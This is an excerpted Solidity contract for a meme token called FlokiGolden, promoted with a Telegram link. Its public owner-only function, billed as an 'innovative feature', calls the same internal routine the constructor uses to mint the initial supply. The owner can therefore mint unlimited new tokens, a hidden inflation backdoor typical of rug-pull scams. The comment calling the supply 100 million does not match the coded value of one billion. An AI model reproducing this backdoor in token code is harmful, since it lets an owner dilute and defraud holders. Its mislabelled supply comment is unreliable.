...
//
// $FlokiGolden proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/flokigolden
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function FlokiGolden(uint256 amount) public onlyOwner {
    _FlokiGolden(msg.sender, amount);
    }
    ...
    function _FlokiGolden(address account, uint256 amount) internal virtual {
...
contract FlokiGolden is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("FlokiGolden", "FGD") {
        _FlokiGolden(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}